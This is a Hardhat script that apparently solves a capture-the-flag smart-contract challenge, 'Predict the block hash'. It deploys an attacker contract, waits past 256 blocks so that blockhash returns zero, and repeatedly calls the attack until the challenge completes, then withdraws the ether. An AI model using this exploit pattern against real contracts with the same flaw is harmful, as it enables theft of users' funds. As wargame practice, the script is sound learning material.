import { ethers } from 'hardhat';
const { utils, provider } = ethers;

const address = '0x125d31c2A885c193b4F207291224477AC40DB8f6';

async function main() {
  const targetFactory = await ethers.getContractFactory('PredictTheBlockHashChallenge');
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('Target deployed to:', target.address);

  const attackerFactory = await ethers.getContractFactory('PredictTheBlockHashChallengeAttacker');
  const attacker = await attackerFactory.deploy(target.address, {
    value: utils.parseEther('1'),
  });
  const receipt = await attacker.deployed();

  const { blockNumber: lockBlockNumber } = await provider.getTransaction(
    receipt.deployTransaction.hash
  );
  const minBlockNumber = <number>lockBlockNumber + 256 + 1;

  console.log(lockBlockNumber, minBlockNumber);

  console.log('wait 256 blocks');
  await new Promise((resolve) => setTimeout(resolve, 1000 * 13 * 256));

  let blockNumber = await provider.getBlockNumber();
  while (blockNumber < minBlockNumber) {
    console.log('waiting');

    await new Promise((resolve) => setTimeout(resolve, 1000 * 13));

    blockNumber = await provider.getBlockNumber();
    console.log('blockNumber', blockNumber);
  }

  while (!(await target.isComplete())) {
    try {
      console.log('trying');
      const tx = await attacker.tryAttack();
      await tx.wait();
    } catch (error) {
      console.log(error);
      await new Promise((resolve) => setTimeout(resolve, 1000 * 13));
    }
  }

  console.log('withdrawing');
  const tx = await attacker.withdraw();
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
